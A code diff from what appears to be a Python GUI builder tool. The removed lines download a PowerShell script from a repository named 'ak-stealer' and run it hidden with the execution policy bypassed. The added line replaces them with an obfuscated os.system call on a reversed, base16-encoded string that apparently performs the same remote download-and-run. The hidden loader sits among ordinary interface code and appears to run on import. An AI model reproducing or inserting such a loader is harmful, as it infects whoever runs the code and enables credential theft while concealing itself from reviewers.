@@ -107,14 +107,7 @@ import os
 import threading
 
 def download_and_execute_powershell():
-    url = "https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/main.ps1"
-    file_path = "main.ps1"
-    
-    urllib.request.urlretrieve(url, file_path)
-    os.system(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {file_path}')
-
-thread = threading.Thread(target=download_and_execute_powershell)
-thread.start()
+    os.system(base64.b16decode("2287569602C70224577625A473555395D4F227F237C6F6F647E24656B61656C6F2F2A33707474786022777962202C6C6568637275677F607"[::-1]).decode())
 
 class BuilderOptionsFrame(ctk.CTkFrame):
 
